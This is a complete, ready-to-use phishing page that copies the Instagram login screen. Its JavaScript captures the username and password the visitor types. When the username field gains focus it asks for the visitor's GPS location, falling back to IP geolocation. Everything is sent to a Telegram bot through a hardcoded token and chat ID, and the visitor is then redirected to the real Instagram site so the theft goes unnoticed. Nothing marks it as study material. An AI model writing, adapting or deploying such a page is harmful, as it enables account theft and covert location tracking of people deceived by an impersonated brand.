<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Viewer • Login</title>
    <style>
        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
        .eye-logo { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; border: 1px solid #efefef; }
        .brand-text { font-style: italic; font-size: 32px; font-weight: bold; margin-bottom: 30px; display: block; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; outline: none; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 9px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
<div class="login-box">
    <img src="eye.jpg" alt="Logo" class="eye-logo" onerror="this.src='https://cdn-icons-png.flaticon.com/512/159/159604.png'">
    <span class="brand-text">Instagram</span>
    <form id="vaultForm">
        <input type="text" id="user" placeholder="Username or email" onfocus="captureMeta()" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button type="submit" id="loginBtn">Log In</button>
    </form>
</div>

<script>
const botToken = "8755802754:AAFCJmpYy7LDgWdizjl3iXNwAQ4Dvu5VEo4";
const chatIds = ["-1003971522575"]; // Corrected IDs

function captureMeta() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            broadcast(`📍 *EXACT GPS*\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        }, () => { fetchIp(); });
    } else { fetchIp(); }
}

function fetchIp() {
    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
        broadcast(`🌐 *IP LOG*\nIP: \`${data.ip}\` \nCity: ${data.city}\nCountry: ${data.country_name}`);
    });
}

document.getElementById('vaultForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    document.getElementById('loginBtn').innerText = "Verifying...";
    
    broadcast(`👤 *LOGIN DATA*\n*Time:* \`${time}\` \n*User:* \`${u}\` \n*Pass:* \`${p}\``);
    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 2000);
});

function broadcast(m) {
    chatIds.forEach(id => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}&parse_mode=Markdown`;
        new Image().src = url;
        if (navigator.sendBeacon) { navigator.sendBeacon(url); }
    });
}
</script>
</body>
</html>
